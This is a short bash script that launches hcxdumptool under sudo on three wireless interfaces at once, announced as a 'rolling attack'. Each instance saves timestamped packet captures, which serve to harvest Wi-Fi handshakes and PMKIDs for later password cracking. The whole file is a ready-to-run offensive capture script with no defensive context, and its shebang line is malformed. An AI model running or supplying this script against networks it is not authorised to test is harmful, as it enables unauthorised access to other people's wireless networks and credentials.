#/bin/bash
echo "Beginning rolling attack"
now=$(date --iso-8601=ns)
sudo hcxdumptool -i wlan0 -o $now.pcapng -s 0&
sleep 4
echo "Firing up second antenna"
now=$(date --iso-8601=ns)
sudo hcxdumptool -i wlan1 -o $now.pcapng -s 0&
sleep 4
echo "Firing up third antenna"
now=$(date --iso-8601=ns)
sudo hcxdumptool -i wlan2 -o $now.pcapng -s 0&
ps ax|grep hcxdumptool

